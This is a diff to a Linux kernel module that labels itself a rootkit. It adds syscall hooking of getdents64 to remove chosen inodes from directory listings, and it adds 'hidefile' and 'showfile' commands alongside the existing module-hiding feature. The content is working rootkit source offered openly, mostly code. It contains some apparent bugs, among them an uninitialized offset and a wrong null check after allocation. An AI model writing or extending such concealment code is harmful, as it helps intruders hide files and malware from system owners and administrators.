@@ -1,6 +1,10 @@
 #include <linux/module.h>
 #include <net/sock.h>
 #include <linux/kprobes.h>
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
+#include <linux/fs.h>
+#include <linux/namei.h>
 
 #define LICENCE "GPL"
 #define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
@@ -15,6 +19,89 @@ MODULE_LICENSE(LICENCE);
 MODULE_DESCRIPTION(DESCRIPTION);
 MODULE_AUTHOR(AUTHOR);
 MODULE_VERSION(VERSION);
+
+
+typedef struct node {
+    long unsigned int inode;
+    struct node * next;
+} node_t;
+
+node_t * head = NULL;
+
+static int inode_in_list(long unsigned int inode) {
+    node_t * node = head;
+    while(node != NULL) {
+        if (node->inode == inode) return 1;
+        node = node->next;
+    }
+    return 0;
+}
+
+static int insert_inode(long unsigned int inode) {
+
+    node_t * node;
+    node_t * n;
+
+    if (inode_in_list(inode)) {
+        return 0;
+    }
+
+    node = (node_t *) kzalloc(sizeof(node_t), GFP_KERNEL);
+    if (node == NULL) {
+        return -1;
+    }
+
+    node->inode = inode;
+
+    if (head == NULL) {
+        head = node;
+        return 0;
+    }
+
+    n = head;
+    while(n->next != NULL) {
+        n = n->next;
+    }
+
+    n->next = node;
+
+    return 0;
+}
+
+static int remove_inode(long unsigned int inode) {
+    node_t * node = head;
+    node_t * last = NULL;
+
+    if (head->inode == inode) {
+        head = head->next;
+        kfree(node);
+        return 0;
+    }
+
+    while (node->next != NULL && node->next->inode != inode) {
+        node = node->next;
+    }
+
+    if (node->next == NULL) return -1;
+
+    last = node;
+    node = last->next;
+    last->next = node->next;
+    kfree(node);
+
+    return 0;
+
+}
+
+static void clear_inodes(void) {
+    node_t * node;
+    while(head != NULL) {
+        node = head;
+        head = head->next;
+        kfree(node);
+    }
+}
+
 
 
 
@@ -93,9 +180,55 @@ static int unhook(unsigned int syscall_number) {
 *          NEW SYSTEM CALLS                                *
 ***********************************************************/
 
-int my_kill(const struct pt_regs * regs) {
-    printk(KERN_INFO "Rootkit: kill hooked! Now invoking original kill system call handler...\n");
-    return original[__NR_kill](regs);
+int my_getdents64(const struct pt_regs * regs) {
+
+    int length;
+    struct linux_dirent64 __user *dirent;
+    struct linux_dirent64 *my_dirent = NULL;
+    struct linux_dirent64 *cur_dirent = NULL;
+    struct linux_dirent64 *prev_dirent = NULL;
+    int offset;
+
+    length = original[__NR_getdents64](regs);
+    if (length == 0) {
+        return length;
+    }
+
+    dirent = (struct linux_dirent64 *)regs->si;
+
+    my_dirent = kzalloc(length, GFP_KERNEL);
+    if (dirent == NULL) {
+        printk(KERN_ALERT "Rootkit: unable to allocate buffer in %s\n", __FUNCTION__);
+        return length;
+    }
+
+    if (copy_from_user(my_dirent, dirent, length) == -1) {
+        printk(KERN_ALERT "Rootkit: unable to copy user data in %s\n", __FUNCTION__);
+        kfree(my_dirent);
+        return length;
+    }
+
+    while (offset < length) {
+        cur_dirent = (void *)my_dirent + offset;
+        if (inode_in_list(cur_dirent->d_ino)) {
+            printk(KERN_INFO "Rootkit: found hidden file %lld %s\n", cur_dirent->d_ino, cur_dirent->d_name);
+            if (!prev_dirent) {
+                length -= cur_dirent->d_reclen;
+                memmove(cur_dirent, (void *)cur_dirent + cur_dirent->d_reclen, length);
+                continue;
+            }
+            prev_dirent->d_reclen += cur_dirent->d_reclen;
+        } else {
+            prev_dirent = cur_dirent;
+        }
+        offset += cur_dirent->d_reclen;
+    }
+
+    if (copy_to_user(dirent, my_dirent, length) ) {
+        printk(KERN_ALERT "Rootkit: Failed to copy to user in getdents64\n");
+    }
+    kfree(my_dirent);
+    return length;
 }
 
 
@@ -119,6 +252,34 @@ static void showmodule(void) {
     list_add(&THIS_MODULE->list, prev_save);
 }
 
+static char * hidefile(const char * file) {
+    struct path path;
+    path.dentry = NULL;
+    kern_path(file,LOOKUP_FOLLOW, &path);
+    if(path.dentry == NULL) {
+        return "no such file or directory.";
+    }
+    
+    if(insert_inode(path.dentry->d_inode->i_ino) == -1) {
+        return "could not hide file";
+    }
+    return "hiding requested file!";
+}
+
+static char * showfile(const char * file) {
+    struct path path;
+    path.dentry = NULL;
+    kern_path(file,LOOKUP_FOLLOW, &path);
+    if(path.dentry == NULL) {
+        return "no such file or directory.";
+    }
+    
+    if(remove_inode(path.dentry->d_inode->i_ino) == -1) {
+        return "file not hidden.";
+    }
+    return "unhide requested file!";
+}
+
 static char * configure(const char * command) {
     if (strcmp(command, "hidemodule") == 0) {
         hidemodule();
@@ -128,7 +289,14 @@ static char * configure(const char * command) {
         showmodule();
         return "Module is now shown.";
     }
-    return "Error: unknowm command!";
+    if (strncmp(command, "hidefile ", 9) == 0) {
+        return hidefile(command+9);
+    }
+    if (strncmp(command, "showfile ", 9) == 0) {
+        return showfile(command+9);
+    }
+    printk(KERN_INFO "Rootkit: unknown command %s\n", command);
+    return "Error: unknowm command";
 }
 
 
@@ -225,9 +393,11 @@ module_load(void) {
     // is hooked and the module unexpectedly unloads, the system
     // will crash.
 
-    if(hook(__NR_kill, my_kill) != 0) {
+    if(hook(__NR_getdents64, my_getdents64) != 0) {
         printk(KERN_ERR "Rootkit:");
     }
+
+    
 
     return 0;
 }
@@ -235,9 +405,11 @@ module_load(void) {
 static void __exit
 module_unload(void) {
 
-    if(unhook(__NR_kill) != 0) {
+    if(unhook(__NR_getdents64) != 0) {
         printk(KERN_ERR "Rootkit:");
     }
+
+    clear_inodes();
 
     close_socket();
 
